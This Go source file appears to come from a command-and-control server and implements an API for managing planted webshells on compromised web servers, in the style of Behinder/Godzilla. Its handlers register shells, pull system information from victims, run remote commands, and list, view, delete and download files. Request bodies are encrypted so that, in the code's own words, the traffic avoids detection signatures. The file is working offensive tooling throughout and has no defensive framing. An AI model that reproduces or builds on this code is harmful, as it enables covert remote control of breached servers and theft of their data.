package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// base64Decode base64 解码辅助函数
func base64Decode(s string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(s)
}

// ============ WebShell 管理 API（与 app.py /api/webshell/* 对齐）============
// 冰蝎/哥斯拉模式: 手动添加 URL，C2 同步代理发请求

// handleWebshellAdd 手动添加 WebShell
func handleWebshellAdd(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		URL       string `json:"url"`
		EncAlgo   string `json:"enc_algo"`
		EncPwd    string `json:"enc_password"`
		Headers   string `json:"http_headers"`
		Timeout   int    `json:"timeout"`
		Proxy     string `json:"proxy"`
		Remark    string `json:"remark"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if data.URL == "" {
		jsonError(w, "URL不能为空", http.StatusBadRequest)
		return
	}

	// 生成 client_id
	clientID := md5Hash(data.URL)[:16]
	if data.EncAlgo == "" {
		data.EncAlgo = "none"
	}
	if data.Timeout == 0 {
		data.Timeout = 30
	}

	// 先尝试获取 sysinfo
	// WebShell 响应格式: {"status":"completed","result":"<json_string>"}
	// 其中 result 字段是 sysinfo action 的 JSON 字符串，需要二次解析
	hostname := "unknown"
	osName := "unknown"
	username := "unknown"
	sysinfoResp, err := webshellExec(data.URL, "sysinfo", map[string]interface{}{}, data.EncAlgo, data.EncPwd, data.Headers, data.Timeout, data.Proxy)
	if err == nil && sysinfoResp != nil {
		// 优先从顶层取（兼容直接返回对象的 WebShell）
		if h, ok := sysinfoResp["hostname"].(string); ok {
			hostname = h
		}
		if o, ok := sysinfoResp["os"].(string); ok {
			osName = o
		}
		if u, ok := sysinfoResp["username"].(string); ok {
			username = u
		}
		// 若顶层无 hostname，尝试解析 result 字段中的 JSON
		if hostname == "unknown" {
			if resultStr, ok := sysinfoResp["result"].(string); ok && resultStr != "" {
				var inner map[string]interface{}
				if jErr := json.Unmarshal([]byte(resultStr), &inner); jErr == nil {
					if h, ok := inner["hostname"].(string); ok {
						hostname = h
					}
					if o, ok := inner["os"].(string); ok {
						osName = o
					}
					if u, ok := inner["username"].(string); ok {
						username = u
					}
				}
			}
		}
	}

	// 写入数据库（client_type=webshell）
	dbExec(`INSERT OR REPLACE INTO clients
		(client_id, hostname, os, username, status, group_name, session_id, session_state,
		 client_type, webshell_url, webshell_enc_algo, webshell_enc_password,
		 webshell_http_headers, webshell_timeout, webshell_proxy, first_seen, last_seen)
		VALUES (?, ?, ?, ?, 'online', 'webshell', ?, 'active',
		 'webshell', ?, ?, ?, ?, ?, ?, ?, ?)`,
		clientID, hostname, osName, username,
		genSessionID(clientID),
		data.URL, data.EncAlgo, data.EncPwd, data.Headers, data.Timeout, data.Proxy,
		nowLocal(), nowLocal())

	addLog("webshell", fmt.Sprintf("添加 WebShell: %s (%s)", data.URL, hostname), clientID, user.UserID, getRequestIP(r))
	broadcastClientUpdate()

	jsonOK(w, map[string]interface{}{
		"success":   true,
		"client_id": clientID,
		"hostname":  hostname,
		"os":        osName,
	})
}

// handleWebshellList 列出 WebShell 客户端
func handleWebshellList(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clients, _ := queryAll("SELECT * FROM clients WHERE client_type='webshell' ORDER BY last_seen DESC")
	if clients == nil {
		clients = []map[string]interface{}{}
	}
	jsonOK(w, clients)
}

// handleWebshellEdit 编辑 WebShell 配置
func handleWebshellEdit(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")
	var data struct {
		URL       string `json:"url"`
		EncAlgo   string `json:"enc_algo"`
		EncPwd    string `json:"enc_password"`
		Headers   string `json:"http_headers"`
		Timeout   int    `json:"timeout"`
		Proxy     string `json:"proxy"`
		Remark    string `json:"remark"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	dbExec(`UPDATE clients SET webshell_url=?, webshell_enc_algo=?, webshell_enc_password=?,
		webshell_http_headers=?, webshell_timeout=?, webshell_proxy=? WHERE client_id=?`,
		data.URL, data.EncAlgo, data.EncPwd, data.Headers, data.Timeout, data.Proxy, clientID)
	jsonOK(w, map[string]interface{}{"success": true})
}

// handleWebshellExec 执行 WebShell 操作（与 app.py /api/webshell/<client_id>/exec 对齐）
// 创建 task 记录，同步执行，返回 task_id 和 status（前端期望这两个字段）
func handleWebshellExec(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")
	client, _ := queryOne("SELECT * FROM clients WHERE client_id=?", clientID)
	if client == nil {
		jsonError(w, "WebShell不存在", http.StatusNotFound)
		return
	}
	if getString(client, "client_type", "") != "webshell" {
		jsonError(w, "非 WebShell 客户端", http.StatusBadRequest)
		return
	}

	var data struct {
		Action string                 `json:"action"`
		Param  map[string]interface{} `json:"param"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// 创建 task 记录（与 Python app.py 对齐，提供审计轨迹）
	taskDataJSON, _ := json.Marshal(data.Param)
	tid, _ := dbExec("INSERT INTO tasks (client_id, task_type, task_data, status, created_at) VALUES (?, ?, ?, 'processing', ?)",
		clientID, data.Action, string(taskDataJSON), nowLocal())
	broadcastTaskUpdate()

	url := getString(client, "webshell_url", "")
	encAlgo := getString(client, "webshell_enc_algo", "none")
	encPwd := getString(client, "webshell_enc_password", "")
	headers := getString(client, "webshell_http_headers", "")
	timeout := int(getInt(client, "webshell_timeout", 30))
	proxy := getString(client, "webshell_proxy", "")

	result, err := webshellExec(url, data.Action, data.Param, encAlgo, encPwd, headers, timeout, proxy)
	wsStatus := "completed"
	dbResult := ""
	if err != nil {
		wsStatus = "failed"
		dbResult = fmt.Sprintf("[ERROR] %s", err.Error())
	} else {
		// 从 WebShell 响应信封中提取内层 result
		// WebShell 响应格式: {"status":"completed","result":"<result_str>"}
		// result_str 可能是纯文本(cmd/file_delete) 或 JSON 字符串(file_list/file_view/file_download)
		if inner, ok := result["result"]; ok {
			dbResult = fmt.Sprintf("%v", inner)
		} else {
			resultJSON, _ := json.Marshal(result)
			dbResult = string(resultJSON)
		}

		// 处理文件下载：从内层 result JSON 中提取 base64 数据，保存为资源文件
		if data.Action == "file_download" && strings.HasPrefix(dbResult, "{") {
			var dlData struct {
				Filename string `json:"filename"`
				Data     string `json:"data"`
			}
			if json.Unmarshal([]byte(dbResult), &dlData) == nil && dlData.Data != "" {
				filename := fmt.Sprintf("webshell_download_%d", time.Now().Unix())
				if dlData.Filename != "" {
					filename = dlData.Filename
				}
				savePath := filepath.Join(getTmpDir(), "downloads", filename)
				os.MkdirAll(filepath.Dir(savePath), 0755)
				decoded, dErr := base64Decode(dlData.Data)
				if dErr == nil {
					os.WriteFile(savePath, decoded, 0644)
					dbResult = fmt.Sprintf(`{"type":"file","path":"/api/resource/downloads/%s","size":%d,"filename":"%s"}`,
						filename, len(decoded), filename)
				}
			}
		}
	}

	// 更新 task 记录
	dbExec("UPDATE tasks SET status=?, result=?, completed_at=? WHERE id=?", wsStatus, dbResult, nowLocal(), tid)
	broadcastTaskUpdate()

	// 更新 last_seen
	dbExec("UPDATE clients SET last_seen=?, status='online' WHERE client_id=?", nowLocal(), clientID)

	addLog("webshell", fmt.Sprintf("WebShell 执行: %s (%s)", data.Action, clientID), clientID, user.UserID, getRequestIP(r))

	jsonOK(w, map[string]interface{}{
		"success": true,
		"status":  wsStatus,
		"result":  dbResult,
		"task_id": tid,
	})
}

// webshellExec 构建并发送 WebShell HTTP 请求（与 app.py _build_ws_request 对齐）
func webshellExec(url, action string, param map[string]interface{}, encAlgo, encPwd, headers string, timeout int, proxy string) (map[string]interface{}, error) {
	if timeout <= 0 {
		timeout = 30
	}

	// 构造请求 payload
	payload := map[string]interface{}{
		"action": action,
		"param":  param,
	}

	// 加密请求体（信封协议，无自定义 HTTP 头，避免流量特征）
	algo := strings.ToLower(encAlgo)
	if algo == "aes" {
		algo = "aes-128-cbc"
	}
	if algo == "" {
		algo = "none"
	}

	var body string
	reqHeaders := map[string]string{"Content-Type": "application/json; charset=utf-8"}
	j, _ := json.Marshal(payload)
	if algo != "none" {
		// 纯密文协议: body 是 base64(IV+密文)，算法用 WebShell 配置的 encAlgo（不传输）
		encrypted, _, err := encEncryptJSON(payload, algo, encPwd)
		if err != nil {
			return nil, fmt.Errorf("加密失败: %w", err)
		}
		body = encrypted
	} else {
		// none 模式: body 是 base64(JSON)
		body = base64.StdEncoding.EncodeToString(j)
	}

	// 合并自定义头
	if headers != "" {
		var customHeaders map[string]string
		if err := json.Unmarshal([]byte(headers), &customHeaders); err == nil {
			for k, v := range customHeaders {
				reqHeaders[k] = v
			}
		}
	}

	// 发送请求
	httpReq, err := http.NewRequest("POST", url, strings.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	for k, v := range reqHeaders {
		httpReq.Header.Set(k, v)
	}

	httpClient := &http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}
	if proxy != "" {
		// TODO: 设置代理
	}

	resp, err := httpClient.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("连接 WebShell 失败: %w", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)

	// 检查 HTTP 状态码，非 200 返回详细错误
	if resp.StatusCode != 200 {
		bodyPreview := string(respBody)
		if len(bodyPreview) > 300 {
			bodyPreview = bodyPreview[:300]
		}
		return nil, fmt.Errorf("WebShell 返回 HTTP %d: %s", resp.StatusCode, bodyPreview)
	}

	// 解析响应：优先纯密文格式（用 WebShell 配置的 encAlgo 解密），兼容旧信封格式 {"_a":"algo","_d":"enc_data"}
	respText := strings.TrimSpace(string(respBody))

	// 优先尝试纯密文解密（用 WebShell 配置的 encAlgo）
	if algo != "none" {
		decrypted, err := encDecrypt(respText, algo, encPwd)
		if err == nil {
			var m map[string]interface{}
			if json.Unmarshal(decrypted, &m) == nil {
				return m, nil
			}
		}
	} else {
		// none 模式: body 是 base64(JSON)
		decoded, dErr := base64.StdEncoding.DecodeString(respText)
		if dErr == nil {
			var m map[string]interface{}
			if json.Unmarshal(decoded, &m) == nil {
				return m, nil
			}
		}
	}

	// 兼容旧信封格式 {"_a":"algo","_d":"enc_data"}
	var envelope map[string]interface{}
	if jErr := json.Unmarshal(respBody, &envelope); jErr == nil {
		if envAlgo, ok := envelope["_a"].(string); ok {
			encData, _ := envelope["_d"].(string)
			if encData == "" {
				return envelope, nil
			}
			if envAlgo == "none" || envAlgo == "" {
				decoded, dErr := base64.StdEncoding.DecodeString(encData)
				if dErr == nil {
					var m map[string]interface{}
					if json.Unmarshal(decoded, &m) == nil {
						return m, nil
					}
				}
				return nil, fmt.Errorf("信封 none 模式响应解析失败 (bodyLen=%d)", len(respBody))
			}
			decrypted, err := encDecrypt(encData, envAlgo, encPwd)
			if err != nil {
				return nil, fmt.Errorf("加密配置不一致: WebShell 用 %s 加密响应，但 C2 解密失败 (bodyLen=%d)", envAlgo, len(respBody))
			}
			var m map[string]interface{}
			if err := json.Unmarshal(decrypted, &m); err != nil {
				return nil, fmt.Errorf("响应 JSON 解析失败: %w (decrypted preview: %s)", err, string(decrypted[:min(200, len(decrypted))]))
			}
			return m, nil
		}
		// JSON 但不是信封格式，直接返回
		return envelope, nil
	}

	// 最后尝试：如果响应看起来像 HTML（404 页面等），返回友好错误
	bodyPreview := respText
	if len(bodyPreview) > 300 {
		bodyPreview = bodyPreview[:300]
	}
	if strings.Contains(bodyPreview, "<html") || strings.Contains(bodyPreview, "<!DOCTYPE") {
		return nil, fmt.Errorf("WebShell 返回了 HTML 页面而非 JSON（可能 URL 错误或 WebShell 未正确部署）: HTTP %d", resp.StatusCode)
	}
	return nil, fmt.Errorf("WebShell 响应解析失败 (HTTP %d, bodyLen=%d): %s", resp.StatusCode, len(respBody), bodyPreview)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
